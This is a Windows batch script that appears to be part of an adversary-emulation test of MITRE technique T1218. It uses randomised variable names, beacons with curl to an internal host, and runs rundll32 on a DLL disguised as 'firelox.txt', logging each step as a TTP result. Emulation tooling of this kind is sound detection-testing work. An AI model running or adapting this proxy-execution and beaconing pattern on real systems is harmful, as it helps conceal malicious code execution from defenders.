@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET douyiw=%APPDATA%\9704\019c798c
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?9704-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=firelox.txt
SET rgnpbq=9704
SET vplog=%APPDATA%\!fkesh!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: heartbeat_start=>> "!vplog!" 2>nul
curl -k -s -o nul "!frytcn!"
echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: heartbeat_complete=>> "!vplog!" 2>nul

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: chdir_start=!douyiw!>> "!vplog!" 2>nul
cd /d "!douyiw!" 2>nul
SET cdtm=1
if not exist "!douyiw!" SET cdtm=0
echo [!DATE! !TIME!][TTP][!eykalkg!][!rgnpbq!]: T1218|Signed Binary Proxy Execution=!cdtm!:>> "!vplog!" 2>nul

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: dll_check=!ecrfwq!>> "!vplog!" 2>nul
if not exist "!ecrfwq!" (
    echo [!DATE! !TIME!][TTP][!eykalkg!][!rgnpbq!]: T1218|Signed Binary Proxy Execution=0:file_not_found>> "!vplog!" 2>nul
    exit /b 1
)

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: process_start=rundll32>> "!vplog!" 2>nul
rundll32.exe !ecrfwq!,DllMain
SET proc=!errorlevel!
SET ttpres=1
SET ttpmsg=
if !proc! neq 0 SET ttpres=0&SET ttpmsg=exec_failed
echo [!DATE! !TIME!][TTP][!eykalkg!][!rgnpbq!]: T1218|Signed Binary Proxy Execution=!ttpres!:!ttpmsg!>> "!vplog!" 2>nul
echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: process_exit=!proc!>> "!vplog!" 2>nul